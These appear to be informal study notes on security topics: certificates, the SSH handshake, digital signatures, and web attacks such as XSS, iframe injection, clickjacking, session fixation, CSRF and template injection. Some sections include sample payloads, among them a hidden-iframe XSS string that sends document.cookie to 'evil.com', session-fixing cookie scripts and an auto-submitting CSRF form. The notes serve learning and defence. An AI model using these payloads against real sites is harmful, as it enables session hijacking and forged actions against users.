    >Serial Number of the Certificate. Every certificate issued by a certificate authority (CA) has a serial number that is unique among the certificates issued by that CA.
    
- 
  >Information about your public key, including the algorithm used and a representation of the key itself.
  
-   
    >The distinguished name (DN) of the CA that issued the certificate.

    >The time during which the certificate is valid. For example, between 2:00 p.m. on March 26, 2000 and 2:00 p.m. on March 28, 2001.
    
	- `Signature Section`
    
    >The cipher or cryptographic algorithm that is used by issuing the CA to create its own digital signature

    >The digital signature for the CA, which is obtained by hashing all of the information in the certificate together and encrypting it with the CA private key.


- >`Template Injection`
    
    >To separate business logic (the logic that receives and processes data) and data representations (the logic that shows the data to the user), in modern web applications templates are often used.

    >Template engines are widely used by web applications to present dynamic data via web pages and emails.

    >Template Injection occurs when user input is embedded in a template in an unsafe manner.

    >However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise  
       
**Server's Identity Verification**

> 1- Client initiates a connection to the server and server responds with the SSH protocol version it supports. At this point client will continue if it supports the ssh version indicated by the server otherwise the communication breaks.

>2- If the client is good to go with the SSH version indicated by the server, both server and client switch to *Binary Packet Protocol*

>3- Server will now send some sensitive information to the client

	> RSA public key of the server which is created during the openssh server installation

	If the client is communication with the server for the first time, client will get a warning on his screen.

	[root@slashroot1 ~]# ssh 192.168.0.105
	The authenticity of host '192.168.0.105 (192.168.0.105)' can't be established.

	RSA key fingerprint is 
    c7:14:f4:85:5f:52:cb:f9:53:56:9d:b3:0c:1e:a3:1f.
	Are you sure you want to continue connecting (yes/no)?

	This is a host identity and not a user identity. Once the client hits yes, this gets saved in the *known_hosts* file

		> Server key. This key is regenerated after every hour and its default size is 768bits. (/etc/ssh/sshd_config)

		> 8 random bytes also called checkbytes. Its necessary to send these bytes by the client to the server
		  in its next reply.

		> All supports encryption methods and authentication methods.


	4 - According to the list of encryption algorithms supported by the server, the client simply creates a 
	random symmetric key and sends that symmetric key to the server. This symmetric key will be used to encrypt
	as well as decrypt the whole communication during this session. This symmetric key is doubly encrypted using
	server host key/ RSA public key first and then encrypted using server key.

	The doubly encrypted symmetric key is sent along with the selected algorithm by the client. 
	The algorithm is selected from the options 
	provided by the server in the step 3.

	5- After sending the session key(which is double encrypted with server key and server host key), the client

	waits for a confirmation message from the server. The confirmation from the server must be encrypted with
	the symmetric session key, which the client sent.

	Once the client receives a confirmation from the server, both of them can now start the communication with this symmetric 			encryption key.


- >` Client's Identity Verification**`

     Various types are there -- Most popular are password based and Public Key Authentication

	>1- The remote server on getting the passwords, logs in the user, based on the server's native
	    password authentication mechanism.
	The password transmitted by the client to the server is encrypted through the session symmetric key
	(which only the server and the client knows)

	>2- Public Key Authentication
		> the client first needs to create an RSA public and private key(id_rsa, id_rsa.pub). Which can be done by a command called ssh-keygen.

	> This public key will be given to all those server's where your require authentication. So a client that needs log-in to multiple servers using public key, needs to distribute his key to those multiple servers first.
	> Sharing means the content of the file id_rsa.pub, must be there in the file authorized_keys on the server.

	> From the list of authentication method's supported by the server, the client will selecta public key authentication and will also send the the details about the cryptography used for this public key authentication.
    
    > The server on receiving the public key authentication request, will first generate a random 256 bit string as a challenge for the client, and encrypt it with the client public key, which is inside the authorized_keys file. 
		
    > The client on receiving the challenge, will decrypt it with the private key(id_rsa). 
		> The client will now combine that string with the session key(which was previously negotiated 
		and is being used for symmetric encryption.) And will generate a md5 hash value. This hash value is
		send to the server.
		> The server on receiving the hash, will regenerate it(because the server also has both the random string
		as well as the session key), and if it matches the hash send by the client, the client authentication succeeds.


- **`Digital Signature`**

		1. Message sent by the user was not tampered in transit.
		2. Message has been sent by the legitimate user.
		
    > ***`Process`***

	**Sender**
    
		- Take the email and generate a one way hash using MD5 or SHA1
		- Take the one way hash and create a Signature using the owner's private key (This proves that the sender has a private key)

			(Hash is encrypted using private key) = signature

		- Send the message along with the signature = Digitally signed data

	Signature is an method/algorithm that takes in hash(message digest) and private key to produce a signature.
    

	**Receiver**

		- On receiving, receiver wants to ensure that its untampered. So generate the message hash with 
		   the same algorithm SHA1
		- The encrypted hash or the signature is decrypted using sender's public key and the hash is obtained.
		- Hash from step1 and Step2 is compared to confirm if the message is untampered.


- >**`Iframe Injection`**
    
    >An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes. Ex: This can be used to exploit a known bug in IE browsers. 


- > **`XSS using Iframe Injection`**
>
	1. Attackers hosts a page evil.com

	2. A website example.com has a XSS vulnerable parameter q.

	3.The user is tricked to visit evil.com that contains an iframe, which makes request to 
	the flawed example.com
   
	<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>

	4.When the evil.com page is visited by the victim, the browser makes a request to example.com silently using iframe. The request contains the xss vulnerable parameter and the payload is injected along.

	5.The payload says to make a request to evil.com along with the cookie of the example.com website.

     

- >`CSRF using iframe injection`

    
   > Here the user doesn't knows that example.com was visited.
    

- >`X-Frame-Options`
    
   >This Headers tells the browser not to allow loading of the webpage in an iframe, frame or object.
   
- >`Clickjacking`
    
    >It is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into
    
    >clicking on a button or link, to another server in which they have an identical looking window.

	>Example: For example, imagine an attacker who builds a web site that has a button on it that says

	>"click here for
	a free iPod". However, on top of that web page, the attacker has loaded an iframe with your mail account, and


	>lined up exactly the "delete all messages" button directly on top of the "free iPod" button. The victim tries

	>to click on the "free iPod" button but instead actually clicked on the "delete all messages" button. In essence,
	the attacker has "hijacked" the user's click, hence the name "Clickjacking"
    

- > `XPATH injection`
    
	- 1. Xpath is a language used to query certain parts of a XML document. It can be compared to
		the SQL language used to query databases.

		2. XPath Injection attacks occur when a web site uses user-supplied information to construct
		an XPath query for XML data.

		3. By sending intentionally malformed information into the web site, an attacker can find out how the
		XML data is structured, or access data that he may not normally have access to.

    
    **Mitigation:**

		> Use a parameterized XPath interface if one is available, or escape the user input to make

		it safe to include in a dynamically constructed query.

		 >Input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.

- >**`Session Fixation`**
  
  - >attack is an attack technique that forces a user's session ID to an explicit value that permits an attacker to hijack a valid user session

    >The example below explains a simple form, the process of the attack, and the expected results.

    >(1) The attacker has to establish a legitimate connection with the web server which 
    (2) issues a session ID or, the attacker can create a new session with the proposed session ID, then, 
    (3) the attacker has to send a link with the established session ID to the victim, she has to click on the link sent from the attacker accessing the site, 
    (4) the Web Server saw that session was already established and a new one need not to be created, 
    (5) the victim provides his credentials to the Web Server, 
    (6) knowing the session ID, the attacker can access the user's account.

	> Meta tag attack : Using this we can set a cookie value on the server.
			http://website.kon/<meta http-equiv=Set-Cookie content=”sessionid=abcd”>

	> A Cross-site Scripting vulnerability present on any web site in the domain can be used  to modify the current cookie value.
			http://example/<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script>

	> HTTP header response
			The insertion of the value of the SessionID into the cookie manipulating the server response 				
            can be made, intercepting the packages exchanged between the client and the
			Web Application inserting the Set-Cookie parameter.

        https://www.owasp.org/index.php/Session_fixation

- > `CRLF Injection / HTTP Response Splitting`
    
    >is a web application vulnerability happens due to direct passing of user entered data to the response header fields like (Location, Set-Cookie and etc) without proper sanitsation, which can result in various forms of security exploits. Security exploits range from XSS, Cache-Poisoning, Cache-based defacement, page injection and etc.
    
    >CR (Carriage Return) and LF (Line Feed) are non-printable characters which together indicate end-of-line.

    lf-injection-http-response-splitting-explained/
    
- `JSON` 

>JSON is JavaScript Object Notation: Its a text based data exchange protocol used by the applications. Human readable and data can be arranged in hierarchial way.

>Heavily used in AJAX instead of XML due to its light weight.


- `CSRF`

>CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.

>Malicious website exploits the trust between the victim's browser and the vulnerable website to which victim is authenticated to.

>CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.

 	1. Can happen if website is vulnerable to html injection or xss.
	1. Malicious website hosting the vulnerable Form or GET request.
	2. img src, script src, iframe src tags can be used.
    -----------------------
    Ex- CSRF using iframe--
    -----------------------			
			<iframe name="attack" style=display:none></iframe>
			<form action="bawhaha" method="POST" target="attack">
			<script>document.forms[0].submit();</script>

		1. Create a POST request form containing CSRF submit request
		2. Create an iframe
		3. POST request is made as soon as the victim visits the page.
		4. The response is loaded in the invisible iframe by putting a "target" paramter within
			the Form attribute.
	


> `Ex- Breaking CSRF token cipher/hashing`

   - **CSRF Mitigation**
    
    >SameSite attribute used with Set-Cookie header prevents the browser from sending this cookie
    
    >along with cross-site requests. The main goal is mitigate the risk of cross-origin information leakage.
	
    Set-Cookie: key=value; HttpOnly; SameSite=strict

    
> `IDOR : Authorization Problem`

    
    When a developer fails to apply authorization checks while various objects are being referenced.Happens in a multiuser system where a user is able to access another user's objects which he/she shouldn't be allowed to.


> `Template Injection`

>To separate business logic (the logic that receives and processes data) and data representations (the logic that shows the data to the user), 	in modern web applications templates are often used.

>Template engines are widely used by web applications to present dynamic data via web pages and emails.

>Template Injection occurs when user input is embedded in a template in an unsafe manner.

>However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.
